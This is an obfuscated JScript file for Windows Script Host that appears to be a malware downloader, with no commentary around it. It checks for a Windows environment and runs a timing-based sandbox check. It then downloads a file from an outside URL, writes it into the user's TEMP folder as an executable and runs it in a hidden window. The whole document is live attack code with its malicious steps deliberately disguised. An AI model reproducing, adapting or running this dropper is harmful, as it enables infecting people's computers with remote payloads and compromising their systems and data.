var RW = false;
var j = "CreateObject";
var r = function Cm() {return WScript[j]("WScript.Shell");}(), DE = 11;
var uf = "MSXML2.XMLHTTP";
var oH = 2123213;
var E = 0;
function n(ot){r["Run"](ot, E, E);};
function l(){return "" + uf;};
function o(UN, Jb){E = E * 1; return UN - Jb;};
function Vk(){return j;};
/*@cc_on
  @if (@_win32 || @_win64)
    RW = true;
  @end
@*/
if (RW)
{
var CC = "";
function Vb(){return 22;};
var b = 0; var k = 0;
function T()
{
var z = new this["Date"]();
var jG = z["getUTCMilliseconds"]();
WScript["Sleep"](Vb());
var z = new this["Date"]();
var FU = z["getUTCMilliseconds"]();
WScript["Sleep"](Vb());
var z = new this["Date"]();
var fA = z["getUTCMilliseconds"]();
var b = "le";
b = o(FU, jG);
var k = "Mu";
k = o(fA, FU);
CC = "open";
return o(b, k);
}
var f = false;
var Y = false;
for (var a = E; a < Vb() * 1; a++){if (T() != E){
f = true; 
k = "31" + 11 * b + k; 
Y = true; 
break;
}}
function Au() {return ((f == true) && (f == Y)) ? 1 : E;};
if (f && Au() && Y){
function LJ() {return r["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Rd0rCZVg2110be.exe";};
 OA = l();
 J = WScript[j](OA);
 var QP = 1;
 while (QP){
try {
J[CC]("GET", "http://www.the2ndedit.com/j1oisa", false);
J["send"]();
I = "Sleep";
for (;;){WScript[I](Vb() * 11); if (J["readystate"] >= 2 * 2) break;};
QP = E;
} catch(xv){};
}
function G(h) {var j0 = (1, 2, 3, 4, 5, h); return j0;};
fz = WScript[Vk()]("ADODB.Stream");
OA = fz;
OA[CC]();
OA["type"] = G(1);
OA["write"](J["ResponseBody"]);
fz["position"] = G(E);
OA["Save" + "ToFile"](LJ(), 2);
fz["c"+"lose"]();
oN = LJ();
n(oN);
}
}

